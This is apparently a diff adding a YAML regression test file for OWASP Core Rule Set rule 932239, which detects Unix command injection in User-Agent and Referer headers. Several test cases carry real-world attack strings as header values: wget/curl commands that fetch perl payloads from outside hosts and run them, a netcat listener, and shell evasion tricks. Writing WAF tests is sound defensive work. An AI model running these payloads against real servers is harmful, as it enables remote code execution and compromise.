@@ -1,0 +1,649 @@
+---
+meta:
+  author: "Franziska Bühler, Max Leske, Esad Cetiner, Xhoenix"
+  description: |
+    Unix shell RCE
+      - with / without prefix
+      - command words of any length
+      - usual targets + `Referer` and `User-Agent`
+  enabled: true
+  name: 932239.yaml
+tests:
+  - test_title: 932239-1
+    desc: "Unix RCE in request headers"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: ";chmod +x evil.php"
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.0
+          output:
+            log_contains: id "932239"
+  - test_title: 932239-2
+    desc: "Unix RCE in request headers - uppercase"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: ";CHMOD +X EVIL.PHP"
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.0
+          output:
+            log_contains: id "932239"
+  - test_title: 932239-3
+    desc: System Command Injection (932239) from old modsec regressions
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip,deflate
+              Accept-Language: en-us,en;q=0.5
+              Host: localhost
+              Keep-Alive: '300'
+              Proxy-Connection: keep-alive
+              User-Agent: system('echo cd /tmp;wget http://turbatu.altervista.org/apache_32.png -O p2.txt;curl -O http://turbatu.altervista.org/apache_32.png; mv apache_32.png p.txt;lyxn -DUMP http://turbatu.altervista.org/apache_32.png >p3.txt;perl p.txt; perl p2.txt;perl p3.txt;rm -rf
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.1
+          output:
+            log_contains: id "932239"
+  - test_title: 932239-4
+    desc: System Command Injection (932239) from old modsec regressions
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip,deflate
+              Accept-Language: en-us,en;q=0.5
+              Host: localhost
+              Keep-Alive: '300'
+              Proxy-Connection: keep-alive
+              User-Agent: http://ricky.ilmerlodellarocca.com/upload.php;lwp-download http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;wget http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;curl -O http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg; appa.jpg;perl appa.jpg;rm -rf appa.jpg;wget http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;curl -O http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;lwp-download http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;mv ca.php ca.php;chmod 755 ca.php
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.1
+          output:
+            log_contains: id "932239"
+  - test_title: 932239-5
+    desc: True Positive Fix Test 1 ISO-8859-2, ISO-8859-3, ISO-8859-4, ISO-8859-5, ISO-8859-6, ISO-8859-7, ISO-8859-8, ISO-8859-10, ISO-8859-14, ISO-8859-15 are affected because the chars are encoded as decimal html %26%238222%3B and %26%238221%3B entities
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: Something true positive &#8222;The Title&#8221;. After space or new line more characters
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip, deflate, br
+              Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+              Content-Type: application/x-www-form-urlencoded
+            method: POST
+            port: 80
+            uri: /post
+            version: HTTP/1.1
+          output:
+            no_log_contains: id "932239"
+  - test_title: 932239-6
+    desc: System Command Injection (932239) from old modsec regressions
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip,deflate
+              Accept-Language: en-us,en;q=0.5
+              Host: localhost
+              Keep-Alive: '300'
+              Proxy-Connection: keep-alive
+              User-Agent: "OWASP CRS test agent"
+              Referer: system('echo cd /tmp;wget http://turbatu.altervista.org/apache_32.png -O p2.txt;curl -O http://turbatu.altervista.org/apache_32.png; mv apache_32.png p.txt;lyxn -DUMP http://turbatu.altervista.org/apache_32.png >p3.txt;perl p.txt; perl p2.txt;perl p3.txt;rm -rf
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.1
+          output:
+            log_contains: id "932239"
+  - test_title: 932239-7
+    desc: System Command Injection (932239) from old modsec regressions
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip,deflate
+              Accept-Language: en-us,en;q=0.5
+              Host: localhost
+              Keep-Alive: '300'
+              Proxy-Connection: keep-alive
+              User-Agent: "OWASP CRS test agent"
+              Referer: http://ricky.ilmerlodellarocca.com/upload.php;lwp-download http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;wget http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;curl -O http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg; appa.jpg;perl appa.jpg;rm -rf appa.jpg;wget http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;curl -O http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;lwp-download http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;mv ca.php ca.php;chmod 755 ca.php
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.1
+          output:
+            log_contains: id "932239"
+  - test_title: 932239-8
+    desc: True Positive Fix Test 1 ISO-8859-2, ISO-8859-3, ISO-8859-4, ISO-8859-5, ISO-8859-6, ISO-8859-7, ISO-8859-8, ISO-8859-10, ISO-8859-14, ISO-8859-15 are affected because the chars are encoded as decimal html %26%238222%3B and %26%238221%3B entities
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Referer: Something true positive &#8222;The Title&#8221;. After space or new line more characters
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip, deflate, br
+              Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+              Content-Type: application/x-www-form-urlencoded
+            method: POST
+            port: 80
+            uri: /post
+            version: HTTP/1.1
+          output:
+            no_log_contains: id "932239"
+  - test_title: 932239-9
+    desc: "False negative report - user agent"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: ;cp /var/log/apache2/error.log evil.php
+            method: POST
+            port: 80
+            uri: /post
+            version: HTTP/1.0
+          output:
+            log_contains: id "932239"
+  - test_title: 932239-10
+    desc: "Negative test on known user-agent"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "python-requests/2.31.0"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip, deflate, br
+              Accept-Language: en-us,en;q=0.5
+            method: GET
+            port: 80
+            uri: "/get"
+            version: HTTP/1.1
+          output:
+            no_log_contains: id "932239"
+  - test_title: 932239-11
+    desc: "Negative test on known user-agent"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "Python-urllib/3.9"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip, deflate, br
+              Accept-Language: en-us,en;q=0.5
+            method: GET
+            port: 80
+            uri: "/get"
+            version: HTTP/1.1
+          output:
+            no_log_contains: id "932239"
+  - test_title: 932239-12
+    desc: "Negative test on known user-agent"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "Snap URL Preview Service; bot; snapchat; https://developers.snap.com/robots"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip, deflate, br
+              Accept-Language: en-us,en;q=0.5
+            method: GET
+            port: 80
+            uri: "/get"
+            version: HTTP/1.1
+          output:
+            no_log_contains: id "932239"
+  - test_title: 932239-13
+    desc: "Negative test on known user-agent"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "w3m/0.5.1"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip, deflate, br
+              Accept-Language: en-us,en;q=0.5
+            method: GET
+            port: 80
+            uri: "/get"
+            version: HTTP/1.1
+          output:
+            no_log_contains: id "932239"
+  - test_title: 932239-14
+    desc: "Negative test on known user-agent"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "Links (2.3pre1; Linux 2.6.38-8-generic x86_64; 170x48)"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip, deflate, br
+              Accept-Language: en-us,en;q=0.5
+            method: GET
+            port: 80
+            uri: "/get"
+            version: HTTP/1.1
+          output:
+            no_log_contains: id "932239"
+  - test_title: 932239-15
+    desc: "Negative test on known user-agent"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "wget"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip, deflate, br
+              Accept-Language: en-us,en;q=0.5
+            method: GET
+            port: 80
+            uri: "/get"
+            version: HTTP/1.1
+          output:
+            no_log_contains: id "932239"
+  - test_title: 932239-16
+    desc: "Negative test on known user-agent"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "curl/7.81.0"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip, deflate, br
+              Accept-Language: en-us,en;q=0.5
+            method: GET
+            port: 80
+            uri: "/get"
+            version: HTTP/1.1
+          output:
+            no_log_contains: id "932239"
+  - test_title: 932239-17
+    desc: "Negative test on known user-agent"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "Cpanel-HTTP-Client/1.0"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip, deflate, br
+              Accept-Language: en-us,en;q=0.5
+            method: GET
+            port: 80
+            uri: "/get"
+            version: HTTP/1.1
+          output:
+            no_log_contains: id "932239"
+  - test_title: 932239-18
+    desc: "IXMZUXBG"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              User-Agent: a=nc&&$a -nlvp 555
+              Host: localhost
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.0
+          output:
+            log_contains: id "932239"
+  - test_title: 932239-19
+    desc: "IXMZUXBG"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              User-Agent: "OWASP CRS test agent"
+              Host: localhost
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Referer: a=nc&&$a -nlvp 555
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.0
+          output:
+            log_contains: id "932239"
+  - test_title: 932239-20
+    desc: "FP with word comment"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              User-Agent: "https://example.com/?args=comment"
+              Host: localhost
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.0
+          output:
+            no_log_contains: id "932239"
+  - test_title: 932239-21
+    desc: "FP with word settings"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              User-Agent: "https://example.com/?args=settings"
+              Host: localhost
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.0
+          output:
+            no_log_contains: id "932239"
+  - test_title: 932239-22
+    desc: "FP with word environment"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              User-Agent: "environment"
+              Host: localhost
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.0
+          output:
+            no_log_contains: id "932239"
+  - test_title: 932239-23
+    desc: "FP with word environment"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              User-Agent: "OWASP CRS test agent"
+              Host: localhost
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Referer: "https://example.com/?args=environment"
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.0
+          output:
+            no_log_contains: id "932239"
+  - test_title: 932239-24
+    desc: "FP with word performance"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              User-Agent: "performance"
+              Host: localhost
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.0
+          output:
+            no_log_contains: id "932239"
+  - test_title: 932239-25
+    desc: "FP with word performance"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              User-Agent: "OWASP CRS test agent"
+              Host: localhost
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Referer: "https://example.com/?args=performance"
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.0
+          output:
+            no_log_contains: id "932239"
+  - test_title: 932239-26
+    desc: "Block execution of env command with arguments"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              User-Agent: "env --version"
+              Host: localhost
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.1
+          output:
+            log_contains: id "932239"
+  - test_title: 932239-27
+    desc: "Block execution of env command with arguments"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              User-Agent: "OWASP CRS test agent"
+              Host: localhost
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              referer: "https://example.com/?args=env --version"
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.1
+          output:
+            log_contains: id "932239"
+  - test_title: 932239-28
+    desc: "Block execution of perf command with arguments"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              User-Agent: "perf --version"
+              Host: localhost
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.1
+          output:
+            log_contains: id "932239"
+  - test_title: 932239-29
+    desc: "Block execution of perf command with arguments"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              User-Agent: "OWASP CRS test agent"
+              Host: localhost
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              referer: "https://example.com/?args=perf --version"
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.1
+          output:
+            log_contains: id "932239"
+  - test_title: 932239-30
+    desc: "Block evasion using here string"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: ";`cat<<<ifconfig`"
+            method: POST
+            port: 80
+            uri: /post
+            version: HTTP/1.0
+          output:
+            log_contains: id "932239"
+  - test_title: 932239-31
+    desc: "Block evasion using here string with space"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: ";`cat<<< ifconfig`"
+            method: POST
+            port: 80
+            uri: /post
+            version: HTTP/1.0
+          output:
+            log_contains: id "932239"
+  - test_title: 932239-32
+    desc: "Block evasion using here string with single quotes"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: ";`cat<<<'ifconfig'`"
+            method: POST
+            port: 80
+            uri: /post
+            version: HTTP/1.0
+          output:
+            log_contains: id "932239"
+  - test_title: 932239-33
+    desc: "Block evasion using here string with double quotes"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: ';`cat<<<"ifconfig"`'
+            method: POST
+            port: 80
+            uri: /post
+            version: HTTP/1.0
+          output:
+            log_contains: id "932239"
+  - test_title: 932239-34
+    desc: "Block evasion using here string with command substitution"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: ";`cat<<<$(ifconfig)`"
+            method: POST
+            port: 80
+            uri: /post
+            version: HTTP/1.0
+          output:
+            log_contains: id "932239"
+  - test_title: 932239-35
+    desc: "Block `time` prefix"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "time ifconfig"
+            method: POST
+            port: 80
+            uri: /post
+            version: HTTP/1.0
+          output:
+            log_contains: id "932239"
+  - test_title: 932239-36
+    desc: "Block `strace` prefix"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "strace ifconfig"
+            method: POST
+            port: 80
+            uri: /post
+            version: HTTP/1.0
+          output:
+            log_contains: id "932239"
+  - test_title: 932239-37
+    desc: "Block `nohup` prefix"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: "nohup ifconfig"
+            method: POST
+            port: 80
+            uri: /post
+            version: HTTP/1.0
+          output:
+            log_contains: id "932239"
